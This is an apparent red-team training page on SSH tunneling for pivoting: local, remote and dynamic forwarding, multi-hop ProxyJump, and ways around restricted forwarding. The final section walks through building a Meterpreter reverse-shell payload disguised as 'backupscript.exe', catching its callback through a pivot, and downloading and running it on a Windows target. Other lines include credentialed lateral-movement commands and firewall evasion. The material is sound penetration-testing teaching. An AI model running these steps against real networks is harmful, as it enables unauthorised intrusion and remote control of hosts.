---
layout: training-page
title: "SSH Tunneling — Red Team Academy"
module: "Pivoting & Tunneling"
tags:
  - ssh
  - port-forwarding
  - socks
  - pivoting
page_key: "pivoting-ssh-tunneling"
render_with_liquid: false
---

# SSH Tunneling

## Overview

SSH is the most versatile pivoting tool available — it's already present on nearly every Linux system, requires no extra software, and supports multiple forwarding modes. Mastering SSH port forwarding lets you access services on isolated network segments through a single compromised host with SSH access.

The three core forwarding types are local (-L), remote (-R), and dynamic (-D). Each solves a different pivoting scenario.

![SSH tunneling types: local forwarding (-L) attacker to target via pivot, remote forwarding (-R) reverse direction, dynamic (-D) SOCKS5 proxy to multiple targets](/images/pivoting/ssh-tunneling-types.svg)  
*// ssh tunneling modes — local, remote, and dynamic (socks5) forwarding*

## Local Port Forwarding (-L)

Local forwarding creates a port on your attack box that forwards traffic through the SSH connection to a target host reachable by the pivot. Use this to access a service behind the pivot (e.g., RDP on an internal host).

```
# Syntax:
# ssh -L [local_port]:[target_host]:[target_port] [user]@[pivot]

# Access RDP on internal host (172.16.5.19) through pivot (10.129.202.64):
ssh -L 3389:172.16.5.19:3389 ubuntu@10.129.202.64

# Now connect RDP to localhost:3389 on your attack box:
xfreerdp /v:localhost:3389 /u:Administrator /p:'Password123!'

# Access internal web server through pivot:
ssh -L 8080:172.16.5.100:80 ubuntu@10.129.202.64
# Browse to http://localhost:8080

# Multiple tunnels in one connection:
ssh -L 3389:172.16.5.19:3389 -L 445:172.16.5.19:445 ubuntu@10.129.202.64

# Keep-alive to prevent timeout:
ssh -L 3389:172.16.5.19:3389 -N -f ubuntu@10.129.202.64
# -N: don't execute remote command (forward only)
# -f: background the SSH process
```

## Remote Port Forwarding (-R)

Remote forwarding opens a port on the SSH server (your attack box or a relay) that forwards back to a host reachable from the pivot. This is the reverse — useful when the pivot can't be reached directly, but it can initiate outbound SSH to you.

```
# Syntax:
# ssh -R [remote_port]:[local_host]:[local_port] [user]@[attack_box]

# From pivot: forward port 8080 on attack box back to local port 80
# (exposes pivot's local web service on your attack box)
ssh -R 8080:localhost:80 attacker@10.10.14.5

# More useful: catch a reverse shell callback through pivot
# On attack box — start listener on port 443
# On pivot, forward remote 443 → a Windows target's bind shell:
ssh -R 443:172.16.5.19:4444 ubuntu@10.129.202.64

# Dynamic remote forwarding (SOCKS on attack box, traffic from pivot's perspective):
ssh -R 9050 ubuntu@10.129.202.64
# Opens SOCKS5 on attack box port 9050, traffic originates from pivot
```

## Dynamic Port Forwarding (-D) — SOCKS Proxy

Dynamic forwarding creates a local SOCKS4/5 proxy. Any application that supports SOCKS can route through it, and SSH handles the forwarding to wherever the pivot can reach. This is the most flexible option for tooling that can be proxy-aware.

```
# Create SOCKS proxy on localhost:9050 via pivot:
ssh -D 9050 ubuntu@10.129.202.64 -N -f

# Configure proxychains to use it:
# /etc/proxychains.conf (or /etc/proxychains4.conf):
# socks5  127.0.0.1 9050

# Now run any tool through the proxy:
proxychains nmap -sT -p 445,3389,80,443 172.16.5.0/24
proxychains evil-winrm -i 172.16.5.19 -u Administrator -p 'Password123!'
proxychains crackmapexec smb 172.16.5.0/24
proxychains msfconsole

# Curl through SOCKS:
curl --socks5 127.0.0.1:9050 http://172.16.5.100

# Firefox: Settings → Network → Manual proxy → SOCKS Host 127.0.0.1:9050
```

## SSH Config for Persistent Tunnels

Define tunnels in `~/.ssh/config` to avoid typing long commands. Combine with `ControlMaster` to multiplex connections over a single socket.

```
# ~/.ssh/config
Host pivot
    HostName 10.129.202.64
    User ubuntu
    IdentityFile ~/.ssh/pivot_key
    LocalForward 3389 172.16.5.19:3389
    LocalForward 8080 172.16.5.100:80
    DynamicForward 9050
    ServerAliveInterval 30
    ServerAliveCountMax 3

# Connect and all tunnels activate automatically:
ssh pivot

# ControlMaster — reuse connection socket:
Host pivot
    HostName 10.129.202.64
    User ubuntu
    ControlMaster auto
    ControlPath ~/.ssh/cm_%r@%h:%p
    ControlPersist 10m
```

## ProxyJump — Multi-Hop SSH

`ProxyJump` chains SSH through multiple hosts. Ideal when you need to SSH into a host that is only reachable through one or more pivot points.

```
# SSH through pivot1 to reach pivot2, then to final target:
ssh -J ubuntu@10.129.202.64 administrator@172.16.5.19

# Chain three hops:
ssh -J user@hop1,user@hop2 user@final-target

# In ~/.ssh/config:
Host final-target
    HostName 172.16.5.19
    User administrator
    ProxyJump ubuntu@10.129.202.64

# Then simply:
ssh final-target

# ProxyCommand alternative (older OpenSSH):
Host internal
    HostName 172.16.5.19
    ProxyCommand ssh -W %h:%p ubuntu@10.129.202.64
```

## SSH Without Terminal — Port Forwarding Only

Useful when you have SSH creds but want a clean port forwarding session without an interactive shell.

```
# -N: no remote command (forward-only)
# -f: fork to background
# -q: quiet mode
# -T: disable pseudo-terminal allocation

ssh -N -f -q -T -L 3389:172.16.5.19:3389 ubuntu@10.129.202.64

# Check active SSH tunnels:
ps aux | grep ssh
ss -tlnp | grep ssh

# Kill background tunnel:
kill $(pgrep -f "ssh -N")

# Autossh — restart tunnel if connection drops:
autossh -M 0 -N -f -D 9050 ubuntu@10.129.202.64
```

## Pivoting Through Restricted SSH Configurations

Some SSH servers restrict port forwarding via `AllowTcpForwarding no` or `PermitOpen`. Workarounds exist when you have code execution on the pivot.

```
# Check if SSH forwarding is restricted:
# (look for AllowTcpForwarding, PermitOpen, PermitTunnel in /etc/ssh/sshd_config)
grep -i 'AllowTcpForwarding\|PermitOpen\|PermitTunnel' /etc/ssh/sshd_config

# If forwarding is disabled, use a tool like Chisel or rpivot instead
# Or create a raw TCP forward with socat on the pivot:
socat TCP-LISTEN:8080,fork TCP:172.16.5.100:80 &

# SSH through HTTP proxy (ProxyCommand with nc/ncat):
ssh -o "ProxyCommand nc -X connect -x proxy.corp.com:8080 %h %p" ubuntu@10.129.202.64

# SSH over non-standard port to evade firewall:
ssh -p 443 ubuntu@10.129.202.64
```

## Remote Port Forwarding for Reverse Shell Callback

When a Windows target on an internal network needs to callback through a Linux pivot host, use SSH remote port forwarding (`-R`) to route the reverse shell from the pivot back to your attack box listener. The payload connects to the pivot's internal IP; the pivot SSH session carries that traffic back.

```
# Step 1: Create Windows payload that connects to pivot's internal IP:
msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

# Step 2: Start MSF listener on attack box:
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
msf6 exploit(multi/handler) > run

# Step 3: SSH remote port forward — pivot listens on :8080, forwards to attack box :8000
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN
# When Windows executes payload → connects to pivot:8080 → forwarded to attack box:8000

# Step 4: Serve payload via pivot, execute on Windows target:
# On pivot:
python3 -m http.server 8123
# On Windows:
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
C:\backupscript.exe
```
